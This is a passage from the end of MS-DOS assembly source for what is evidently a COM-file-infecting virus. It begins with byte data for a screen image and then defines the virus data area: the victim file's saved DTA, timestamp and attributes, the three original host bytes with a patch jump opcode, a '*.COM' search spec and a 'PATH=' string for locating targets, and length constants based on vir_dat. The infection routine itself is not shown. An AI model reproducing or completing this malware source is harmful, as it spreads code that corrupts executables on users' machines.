        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,'°',10,'±',10,'²',10,'Û',10,'Û'
        DB      10,'Û',10,'Û',10,'Û',10,'Û',10,'Û',10,'²',10,'±',10,'°'
        DB      10,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,'Û',6,'Û',6,'Û',6,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',6,' ',6,' ',6,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' '
        DB      15,' ',15,' ',15,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' ',6,' '
        DB      6,' ',6

olddta_ DW      0                       
olddts_ DW      0                       
oldtim_ DW      0                       
oldate_ DW      0                       
oldatt_ DW      0                       
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H                    
jmpdsp_ DW      0                       
pathad_ DW      0                       
namptr_ DW      0                       
envstr_ DB      'PATH='                 
fspec_  DB      '*.COM',0
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             
dtatim_ DW      0,0                     
dtalen_ DW      0,0                     
dtanam_ DB      0Dh dup (0)             
lst_byt EQU     $                       
                                        
virlen  =       lst_byt - v_start       
codelen =       vir_dat - v_start       
c_len_x =       vir_dat - v_start - 2   
c_len_y =       vir_dat - v_start + 100H
old_dta =       olddta_ - vir_dat       
old_dts =       olddts_ - vir_dat       
old_tim =       oldtim_ - vir_dat       
ol_date =       oldate_ - vir_dat       
old_att =       oldatt_ - vir_dat       
first_3 =       first3_ - vir_dat       
jmp_op  =       jmpop_  - vir_dat       
jmp_dsp =       jmpdsp_ - vir_dat       
f_spec  =       fspec_  - vir_dat       
path_ad =       pathad_ - vir_dat       
nam_ptr =       namptr_ - vir_dat       
env_str =       envstr_ - vir_dat       
wrk_spc =       wrkspc_ - vir_dat       
dta     =       dta_    - vir_dat       
dta_tim =       dtatim_ - vir_dat       
dta_len =       dtalen_ - vir_dat       
dta_nam =       dtanam_ - vir_dat       

        CODE    ENDS
END     VCODE

